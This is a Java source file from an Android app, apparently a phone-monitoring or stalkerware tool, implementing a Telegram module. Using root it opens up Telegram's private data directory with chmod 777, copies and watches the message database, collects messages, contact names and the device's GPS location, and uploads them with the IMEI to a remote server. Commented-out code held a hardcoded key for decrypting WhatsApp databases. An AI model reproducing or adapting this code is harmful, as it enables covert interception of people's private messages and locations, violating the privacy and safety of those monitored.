package com.hyadesinc.curiosus.modules;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.FileObserver;
import android.preference.PreferenceManager;

import com.hyadesinc.curiosus.Debug;
import com.hyadesinc.curiosus.ServerMessanger;
import com.hyadesinc.curiosus.SettingsManager;
import com.hyadesinc.curiosus.lib.FileUtil;
import com.hyadesinc.curiosus.lib.IMMessage;
import com.hyadesinc.curiosus.lib.IMessageBody;
import com.hyadesinc.curiosus.lib.MessageType;
import com.hyadesinc.curiosus.modules.location.LocationModule;
import com.hyadesinc.curiosus.services.AppService;
import com.hyadesinc.curiosus.variables.ServerMessage;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

@SuppressLint("SdCardPath")
public class TelegramModule implements OnSharedPreferenceChangeListener {
//	private static final String CHIPER_TRANSFORMATION = "AES/ECB/PKCS5Padding";
//	private static final String ALGORITHM = "AES";
//	private static final byte[] KEY = new byte[]{ 52, 106, 35, 101, 42, 70, 57, 43, 77, 115, 37, 124, 103, 49, 126, 53, 46, 51, 114, 72, 33, 119, 101, 44 };

//	private static final String W_CLEAR_DB = "/data/data/com.whatsapp/databases/msgstore.db";
//	private static String m_whatsappClearDBName = "/data/data/com.whatsapp/databases/msgstore.db";
//    private static String m_whatsappCryptedDBName = "msgstore.db.crypt";
//    private static String m_whatsappDBName = "whatsapp.db";
//    private static String m_whatsappDataName = "/data/data/com.whatsapp/databases/";

//	private byte[] decryptDB(byte[] encryptedDB) throws Exception {
//	Cipher ciper = Cipher.getInstance(CHIPER_TRANSFORMATION);
//	SecretKeySpec key = new SecretKeySpec(KEY, ALGORITHM);//TODO: test key
//	ciper.init(Cipher.DECRYPT_MODE, key);
//	byte[] result = ciper.doFinal(encryptedDB);
//	return result;
//}

	/** WhatsApp messages db path */
	private static final String PATH_MESSAGES = "/data/data/org.telegram.messenger/files/cache4.db";
	/** WhatsApp contacts db path */
	private static final String[] MESSAGES_COLUMNS = new String[] {"mid", "uid", "read_state", "send_state", "date", "data", "out", "replydata"};
	private static final String[] USERS_COLUMNS = new String[] { "uid", "name", "status", "data" };
	private static final String[] CONTACTS_COLUMNS = new String[] { "uid", "mutual" };
	private static final String SETTINGS_LASTDATE = "TELEGRAM_LAST_DATE";
	private static final String SETTINGS_LASTID = "TELEGRAM_LAST_ID";

	private String LOCAL_PATH_MESSAGES = "";

	private Context mContext;
	private SettingsManager mSettings;
	private String mLastMsgId;
	private long mLastMsgDate;
	private FileObserver mObserver;
	private HashMap<String, String> mUsernames;
	private boolean mIsStarted;

	public TelegramModule(Context context){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		this.mUsernames = new HashMap<String, String>();
		this.mIsStarted = false;

		LOCAL_PATH_MESSAGES = FileUtil.getFullPath(context, "cache4_w.db");

		PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}

	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		if (key.equals("TELEGRAM_ENABLED")){
			if (mSettings.isTelegramEnabled()) {
				if (!mIsStarted) {
					start();
				}
			}
			else{
				if (mIsStarted) {
					stop();
				}
			}
		}
	}

	public synchronized void start(){
		if (!mSettings.isTelegramEnabled()) {
			Debug.i("[TelegramModule] " + mSettings.isTelegramEnabled().toString()) ;
			return;
		}

		if (!isTelegramAvailable()) {
			return;
		}

		if (!AppService.isRootAvailable()) {
			return;
		}

		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/org.telegram.messenger/files/*",
				"chmod 777 /data/data/org.telegram.messenger/files",
				"chmod 777 " + FileUtil.getFullPath(mContext, "*"));

		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				FileUtil.copyFile(PATH_MESSAGES, LOCAL_PATH_MESSAGES);

				SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
				mLastMsgId = settings.getString(SETTINGS_LASTID, getLastMsgId());
                mLastMsgDate = settings.getLong(SETTINGS_LASTDATE, getLastMsgDate());
				mObserver = new TelegramFileObserver();

				Debug.i("[TelegramModule] Start watching");
				mObserver.startWatching();

				mIsStarted = true;
			}
		});

		try {
			RootTools.getShell(true).add(command);

		} catch (Exception e) {
			Debug.exception(e);
		}
	}

	private synchronized void stop() {
		mIsStarted = false;

		try {
			saveLastMsgId(mLastMsgId);
			if (mObserver != null) {
				mObserver.stopWatching();
			}

		} catch (Exception e) {
			Debug.exception(e);
			return;

		} finally {
			mObserver = null;
		}
	}

	public void dispose(){
		stop();
	}

	protected synchronized void getNewChat(){
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/org.telegram.messenger/files/*",
				"chmod 777 /data/data/org.telegram.messenger/files");

		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				_getNewChat();
			}
		});

		try {
			RootTools.getShell(true).add(command);

		} catch (Exception e) {
			Debug.exception(e);
		}
	}

	private synchronized void _getNewChat(){
		if (!FileUtil.copyFile(PATH_MESSAGES, LOCAL_PATH_MESSAGES)) {
			return;
		}

		SQLiteDatabase db = null;

		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			ArrayList<IMessageBody> list = getMessages(db);

			if (list == null) {
				return;
			}



			db.close();
			db = null;

			if (list != null && list.size() > 0 && networkAvailable()) {
				JSONObject obj = new JSONObject();
				new ServerMessanger(
						mContext,
						new ServerMessage(MessageType.TELEGRAM, mSettings.imei(), list),
						new ServerMessanger.ICallBack() {
							@Override
							public boolean onFinished(String response) { return false; }

							@Override
							public void onError() {
							}

							@Override
							public void onSuccess() {
								saveLastMsgId(mLastMsgId);
                                saveLastMsgDate(mLastMsgDate);
							}
						}
				).start();
			}

		} catch (Exception e) {
			Debug.exception(e);

		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
		}
	}

	private ArrayList<IMessageBody> getMessages(SQLiteDatabase db){
		Cursor c = null;
		try {
			ArrayList<IMessageBody> messages = new ArrayList<IMessageBody>();
			IMMessage message;
			long timeout = new Date().getTime() - LocationModule.LOCATION_TIMEOUT;
			Debug.i("Last ID: " + mLastMsgId);
			c = db.query("messages", MESSAGES_COLUMNS, "date > " + mLastMsgDate, null, null, null, null);
			while (c.moveToNext()) {
				String jid = c.getString(1);
				String mid = c.getString(0);
				int type = c.getInt(6); /* c.getInt(1) == 1 - is out;*/
				String text = new String(c.getBlob(5), "UTF-8");
				long date = c.getLong(4); /* time */

				message = new IMMessage(date, text, type);

				if (date >= timeout) {
					Location location = LocationModule.getLocation(mContext);
					if (location != null) {
						message.addLocation(location.getLatitude(), location.getLongitude());
					}
				}

                message.addMessageId(mid);
                message = setUserInfo(jid, message);

				messages.add(message);

				final String lastMsgId = mLastMsgId;
				mLastMsgId = mid;
				saveLastMsgId(mLastMsgId);

                final long lastMsgDate = mLastMsgDate;
                mLastMsgDate = date;
                saveLastMsgDate(mLastMsgDate);
			}

			return messages;

		} catch(Exception e){
			Debug.exception(e);
			return null;

		} finally {
			if (c != null) {
				c.close();
			}
		}
	}

	private synchronized IMMessage setUserInfo(String jid, IMMessage message){
		message.addAuthorUid(jid);

		SQLiteDatabase db = null;
		Cursor c = null;
		try {
            if (jid.contains("-")) {

                db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
                c = db.query("chats", new String[] {"name"}, "uid = ?", new String[] { jid.replace("-", "") }, null, null, null);

                if (c.getCount() != 1) {
                    return message;
                } else if (c.moveToFirst()) {

                    message.addAuthorFullName(c.getString(0));

                    return message;
                }

            } else {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.query("contacts", CONTACTS_COLUMNS, "uid = ?", new String[] { jid }, null, null, null);

			if (c.getCount() != 1) {
				return message;
			} else if (c.moveToFirst()) {
				int mutual = c.getInt(1);

				if (mutual == 1) {
					c = db.query("users", USERS_COLUMNS, "uid = ?", new String[] { jid }, null, null, null);
					if (c.getCount() != 1) {
						return message;
					} else if (c.moveToFirst()) {

						message.addAuthorFullName(c.getString(1));
						message.addAuthorExtra(c.getString(3));


						return message;
					}
				} else {
					return message;
				}
			}
            }

			return message;

		} catch(Exception e){
			e.printStackTrace();
			return message;

		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}

			if (c != null) {
				c.close();
			}
		}
	}

	private String getLastMsgId(){
		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.rawQuery("SELECT MAX(mid) FROM messages", null);
			c.moveToFirst();
			return c.getString(0);

		} catch(Exception e){
			Debug.exception(e);
			return "0";

		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}

			if (c != null) {
				c.close();
			}
		}
	}

    private long getLastMsgDate(){
        SQLiteDatabase db = null;
        Cursor c = null;
        try {
            db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
            c = db.rawQuery("SELECT MAX(date) FROM messages", null);
            c.moveToFirst();
            return c.getLong(0);

        } catch(Exception e){
            Debug.exception(e);
            return 0L;

        } finally {
            if (db != null && db.isOpen()) {
                db.close();
            }

            if (c != null) {
                c.close();
            }
        }
    }

	private String getLastMsgId(SQLiteDatabase db){
		Cursor c = null;
		try {
			c = db.rawQuery("SELECT MAX(mid) FROM messages", null);
			c.moveToFirst();
			return c.getString(0);

		} catch(Exception e){
			Debug.exception(e);
			return "0";

		} finally {
			if (c != null) {
				c.close();
			}
		}
	}

	private Boolean isTelegramAvailable(){
		try {
			mContext.getPackageManager().getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES);
			return true;

		} catch (NameNotFoundException e) {
			return false;
		}
	}

	private synchronized void saveLastMsgId(String lastMsgId){
		if (lastMsgId == "0") {
			return;
		}

		mSettings.telegramLastId(lastMsgId);
	}

    private synchronized void saveLastMsgDate(long lastMsgDate){
        if (lastMsgDate == 0L) {
            return;
        }

        mSettings.telegramLastDate(lastMsgDate);
    }


	private Boolean networkAvailable(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();

		if (info == null){
			return false;
		}

		if (mSettings.onlyWiFi() && info.getType() != ConnectivityManager.TYPE_WIFI){
			return false;
		}

		return info.isConnectedOrConnecting();
	}

	private class MyCommandCapture extends CommandCapture{
		private ICommandCallback callback;

		public MyCommandCapture(String... command){
			super(0, command);
		}

		public void setCallback(ICommandCallback callback){
			this.callback = callback;
		}

		@Override
		public void commandCompleted(int id, int exitcode) {
			if (callback != null) {
				callback.run();
			}
		}
	}

	private interface ICommandCallback{
		public void run();
	}

	private class TelegramFileObserver extends FileObserver {
		private static final long UPDATE_TIOMEOUT = 2 * 1000L;

		private long lastUpdate;

		public TelegramFileObserver() {
			super(PATH_MESSAGES, FileObserver.MODIFY);
		}

		@Override
		public synchronized void onEvent(int event, String path) {
			//Debug.i("onEvent: " + event + "; Path: " + path);

			long now = Calendar.getInstance().getTimeInMillis();
			if (now - lastUpdate < UPDATE_TIOMEOUT) {
				return;
			}

			lastUpdate = now;

			new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						Thread.sleep(UPDATE_TIOMEOUT);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}

					getNewChat();
				}
			}).start();

		}
	}
}
